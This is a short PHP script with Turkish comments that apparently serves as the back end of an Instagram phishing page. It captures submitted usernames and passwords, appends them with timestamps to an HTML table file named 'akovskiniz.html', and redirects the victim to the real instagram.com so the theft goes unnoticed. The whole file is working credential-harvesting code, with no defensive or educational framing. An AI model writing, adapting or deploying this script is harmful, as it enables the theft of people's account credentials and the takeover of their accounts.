<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $kullaniciadi = $_POST["id"];
    $sifre = $_POST["pass"];
    $tarih = date('d.m.Y H:i:s');

    // Veriyi tabloya eklemek için
    $veri = "<tr><td>$tarih</td><td>$kullaniciadi</td><td>$sifre</td></tr>";

    $dosya = "akovskiniz.html";

    // Eğer dosya yoksa tablo başlığını ekleyerek oluştur
    if (!file_exists($dosya)) {
        $baslik = "<head><meta charset='UTF-8'></head><table border='1'><tr><th>Tarih</th><th>Kullanıcı Adı</th><th>Şifre</th></tr>";
        file_put_contents($dosya, $baslik);
    }

    // Veriyi dosyaya ekleyerek yaz
    file_put_contents($dosya, $veri, FILE_APPEND | LOCK_EX);

    header("Location:https://www.instagram.com");
}
?>